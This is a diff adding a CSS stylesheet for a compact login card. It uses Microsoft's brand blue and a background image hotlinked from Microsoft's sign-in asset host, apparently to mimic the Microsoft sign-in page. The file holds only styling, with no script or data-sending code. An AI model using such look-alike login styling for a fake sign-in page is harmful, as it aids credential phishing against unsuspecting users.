@@ -1,0 +1,54 @@
+body {
+  background-image: url(https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
+    }
+    .container {
+      background-color: white;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+    h1 {
+      text-align: center;
+      font-size: 1.2rem;
+      color: #0078d4;
+      margin-bottom: 1.5rem;
+    }
+    p{
+      color: grey;
+      font-size: 14px;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #0078d4;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    button:hover {
+      background: #005a9e;
+    }
+    img{
+      display: block;
+      width: 150px;
+      align-self: center;
+      margin: auto;
+    }
